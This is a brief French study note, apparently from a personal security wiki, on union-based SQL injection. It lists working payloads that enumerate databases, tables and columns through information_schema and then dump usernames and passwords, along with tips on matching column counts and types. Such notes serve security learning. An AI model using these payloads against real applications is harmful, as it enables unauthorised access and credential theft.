
Tout d'abord, le mot clé union permet de joindre verticalement des tables. Ainsi, il est utilisé pour procéder a des injections SQL union-based, en combinant le payload et la requête attendue.
Dans les injections basées sur Union, il est **crutial de trouver le nombre de colonnes dans la table**
Le payload ressemble a:
Pour lister les bases de données, 
```SQL
0 UNION SELECT column1,column2, database()
```
Pour lister les tableaux d'une base de données:
```SQL
 0 UNION SELECT column1,column2, group_concat(table_name) 
FROM information_schema.tables
WHERE table_schema = 'TARGET_DB' 
```
Pour  lister les colonnes d'un tableau:
```SQL
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'TARGET_TABLE'
```
Pour trouver les utilisateurs et leurs identifiants dans une table:
```SQL
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM 'TARGET_TABLE'
```
**important:** Veiller au type  du contenu des colonnes qui sont utilisées, sinon l'injection ne fonctionnera pas. On utilise 0 car c'est généralement un espace sans contenu, laissant notre payload seul a être exécuté.
[[Auth bypass]], [[Boolean based SQLi]] et [[Time-based SQLi]] sont aussi d'autres types d'injection SQL.
